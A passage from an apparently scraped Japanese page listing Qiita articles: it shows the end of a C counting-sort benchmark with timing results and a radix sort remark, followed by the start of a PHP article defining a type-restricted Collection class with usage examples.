  <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"data/%ld/%ld-%d"</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Can't open </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error occurred on fscanf()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span> 
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">counting_sort</span><span class="p">(</span><span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="kt">long</span> <span class="n">y</span><span class="p">[],</span> <span class="kt">long</span> <span class="n">counts</span><span class="p">[],</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">counts</span><span class="p">[</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">counts</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="n">counts</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">y</span><span class="p">[</span><span class="o">--</span><span class="n">counts</span><span class="p">[</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]]]</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">before</span><span class="p">;</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">after</span><span class="p">;</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">counts</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">j</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"count = "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">before</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">);</span>
  <span class="n">after</span>  <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
  <span class="n">counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_array</span><span class="p">(</span><span class="n">before</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="n">MAX</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">counts</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[Before]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">before</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">counting_sort</span><span class="p">(</span><span class="n">before</span><span class="p">,</span> <span class="n">after</span><span class="p">,</span> <span class="n">counts</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[After]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">after</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
    <span class="n">sum</span> <span class="o">+=</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Time[%d]: %ld[msec]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Average: %ld[msec]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sum</span> <span class="o">/</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">before</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">after</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">counts</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></div>
</div>

<h2>
<span id="results-3" class="fragment"></span><a href="#results-3"><i class="fa fa-link"></i></a>Results</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 4[msec]
Time[1]: 4[msec]
Time[2]: 2[msec]
Time[3]: 2[msec]
Time[4]: 3[msec]
Time[5]: 3[msec]
Time[6]: 3[msec]
Time[7]: 3[msec]
Time[8]: 3[msec]

Average: 2[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">50000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 4[msec]
Time[1]: 3[msec]
Time[2]: 4[msec]
Time[3]: 4[msec]
Time[4]: 4[msec]
Time[5]: 3[msec]
Time[6]: 3[msec]
Time[7]: 3[msec]
Time[8]: 3[msec]

Average: 3[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">100000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 5[msec]
Time[1]: 4[msec]
Time[2]: 4[msec]
Time[3]: 4[msec]
Time[4]: 5[msec]
Time[5]: 4[msec]
Time[6]: 4[msec]
Time[7]: 4[msec]
Time[8]: 4[msec]

Average: 3[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">500000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 20[msec]
Time[1]: 19[msec]
Time[2]: 19[msec]
Time[3]: 18[msec]
Time[4]: 20[msec]
Time[5]: 20[msec]
Time[6]: 18[msec]
Time[7]: 18[msec]
Time[8]: 18[msec]

Average: 17[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">1000000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 44[msec]
Time[1]: 43[msec]
Time[2]: 43[msec]
Time[3]: 42[msec]
Time[4]: 41[msec]
Time[5]: 59[msec]
Time[6]: 42[msec]
Time[7]: 44[msec]
Time[8]: 42[msec]

Average: 40[msec]
</pre></div>
</div>

<h1>
<span id="radix-sort" class="fragment"></span><a href="#radix-sort"><i class="fa fa-link"></i></a>Radix Sort</h1>

<p>テーブルのセルをあらかじめ <strong>10×データ数</strong> だけ用意しておくのでは、カウンティングソートの完全劣化となるので、今回はやる意味が薄いと見込んで省略。<br>
基数ソートが優れていると言えるのは、線形リストで同じ基数を持つ要素をつなぐように実装し、その<ins>要素の動的確保(malloc)にかかるコストがゼロであると仮定できるとき</ins>。<br>
つまり理論上の話。</p>

<h1>
<span id="comparison" class="fragment"></span><a href="#comparison"><i class="fa fa-link"></i></a>Comparison</h1>

<p><a href="https://camo.qiitausercontent.com/cc7276100bed44c1f461d6dacf65fc8e961d6a32/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35626462336633322d613762382d343231362d643164322d3737616632303864326233662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/cc7276100bed44c1f461d6dacf65fc8e961d6a32/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35626462336633322d613762382d343231362d643164322d3737616632303864326233662e706e67" alt="graph.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/5bdb3f32-a7b8-4216-d1d2-77af208d2b3f.png"></a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />45位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>22</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/2376f311a9db0370bcbb">PHPの配列要素の型を縛る</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-02-21 16:36:31</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p><strong><a href="http://qiita.com/Hiraku">@Hiraku</a></strong> さんの <strong><a href="http://qiita.com/Hiraku/items/471747cacda58070f3a6" id="reference-cb41ceba9c730f97018f">SplFixedArrayで"純粋な配列"を作る</a></strong> に感化されて衝動的に作ってしまった。</p>

<p>個人的により強く縛りたいと感じるのは、配列のサイズというよりは格納される <strong>要素の型</strong> なので。それならPHPなんか使うなって言われそうだけどまぁうんそうだねはい（適当）</p>

<h1>
<span id="collection" class="fragment"></span><a href="#collection"><i class="fa fa-link"></i></a><strong>Collection</strong>
</h1>

<p><strong>ArrayObject</strong> を継承して作ってみました。使い方はほとんど <strong>ArrayObject</strong> と同じです。</p>

<h2>
<span id="クラス定義" class="fragment"></span><a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>クラス定義</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Collection</span> <span class="k">extends</span> <span class="nx">ArrayObject</span> <span class="p">{</span>

    <span class="k">const</span> <span class="no">TYPE_BOOL</span>        <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_INT</span>         <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_FLOAT</span>       <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_STRING</span>      <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_ARRAY</span>       <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_OBJECT</span>      <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_NULL</span>        <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_RESOURCE</span>    <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_CALLABLE</span>    <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_STRINGABLE</span>  <span class="o">=</span> <span class="mi">512</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_NUMBER</span>      <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_TRAVERSABLE</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">TYPE_ALL</span>         <span class="o">=</span> <span class="mi">1023</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$type</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$object</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$resource</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$type</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_ALL</span><span class="p">,</span> <span class="nv">$object</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$resource</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_int</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span> <span class="k">or</span> <span class="o">!</span><span class="p">(</span><span class="nv">$type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_ALL</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'Unknown type definition.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$object</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="nb">is_object</span><span class="p">(</span><span class="nv">$object</span><span class="p">)</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="nb">get_class</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$object</span><span class="p">)</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="nv">$object</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">default</span><span class="o">:</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'Illegal object type definition.'</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$resource</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span> <span class="o">=</span> <span class="nb">get_resource_type</span><span class="p">(</span><span class="nv">$resource</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span> <span class="o">=</span> <span class="nv">$resource</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">default</span><span class="o">:</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'Illegal resource type definition.'</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$offset</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">DomainException</span><span class="p">(</span><span class="s1">'Illegal offset type.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_BOOL</span>       <span class="k">and</span> <span class="nb">is_bool</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_INT</span>        <span class="k">and</span> <span class="nb">is_int</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_FLOAT</span>      <span class="k">and</span> <span class="nb">is_float</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_STRING</span>     <span class="k">and</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_ARRAY</span>      <span class="k">and</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_NULL</span>       <span class="k">and</span> <span class="nb">is_null</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_CALLABLE</span>   <span class="k">and</span> <span class="nb">is_callable</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_OBJECT</span>     <span class="k">and</span> <span class="nb">is_object</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">TYPE_STRINGABLE</span> <span class="k">and</span> <span class="nx">self</span><span class="o">::</span><span class="na">isStringable</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">DomainException</span><span class="p">(</span><span class="s1">'Illegal value type.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">!==</span> <span class="k">null</span> <span class="k">and</span>
                <span class="nb">is_object</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="k">and</span>
                <span class="o">!</span><span class="p">(</span><span class="nv">$value</span> <span class="nx">instanceof</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="p">)</span><span class="o">:</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">DomainException</span><span class="p">(</span><span class="s1">'Illegal object type.'</span><span class="p">);</span>
            <span class="k">case</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span> <span class="o">!==</span> <span class="k">null</span> <span class="k">and</span>
                <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="k">and</span>
                <span class="nb">get_resource_type</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">!==</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">:</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">DomainException</span><span class="p">(</span><span class="s1">'Illegal resource type.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">parent</span><span class="o">::</span><span class="na">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">isStringable</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nb">is_object</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="s1">'__toString'</span><span class="p">)</span><span class="o">:</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h2>
<span id="基本的な使い方" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>基本的な使い方</h2>

<p>型が適合しなかったときには <strong>DomainException</strong> がスローされます。</p>

<h3>
<span id="整数" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0"><i class="fa fa-link"></i></a>整数</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_INT</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</pre></div></div>

<h3>
<span id="数値整数と浮動小数点数と論理値" class="fragment"></span><a href="#%E6%95%B0%E5%80%A4%E6%95%B4%E6%95%B0%E3%81%A8%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0%E3%81%A8%E8%AB%96%E7%90%86%E5%80%A4"><i class="fa fa-link"></i></a>数値（整数と浮動小数点数と論理値）</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_NUMBER</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</pre></div></div>

<h3>
<span id="コーラブル" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%A9%E3%83%96%E3%83%AB"><i class="fa fa-link"></i></a>コーラブル</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_CALLABLE</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'strlen'</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">function</span> <span class="p">()</span> <span class="p">{</span> <span class="k">echo</span> <span class="s1">'こんにちは世界'</span><span class="p">;</span> <span class="p">};</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">new</span> <span class="nx">SimpleXMLElement</span><span class="p">(</span><span class="s1">'&lt;xml&gt;&lt;/xml&gt;'</span><span class="p">),</span> <span class="s1">'addChild'</span><span class="p">);</span>
</pre></div></div>

<h3>
